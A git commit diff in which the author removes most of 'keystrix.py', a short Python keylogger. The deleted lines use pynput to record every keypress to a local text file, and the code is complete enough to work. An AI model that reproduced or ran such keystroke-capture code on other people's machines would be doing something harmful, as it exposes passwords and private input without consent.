0cf8fe35302b94cf16939dcf4a64af7d91898e5e
TRASHZ403 <107699834+trashz403@users.noreply.github.com>
2024-04-06 00:33:30 -0500

    Update keystrix.py

--- keystrix.py
+++ keystrix.py
@@ -2,20 +2,4 @@ import pynput
 from pynput.keyboard import Key, Listener
 import datetime
 
-def on_press(key):
-    with open("/home/z403/authorized/test.txt", "a") as f:
-        if isinstance(key, Key):
-            if key == Key.space:
-                f.write(" ")
-            elif key == Key.enter:
-                f.write("\n")
-            elif key == Key.backspace:
-                f.seek(f.tell() - 1, 0)
-                f.truncate()
-        else:
-            f.write(str(key).strip("'"))
 
-with Listener(on_press=on_press) as listener:
-    with open("test.txt", "a") as f:
-        f.write(f"Logging started at: {datetime.datetime.now()}\n")
-    listener.join()
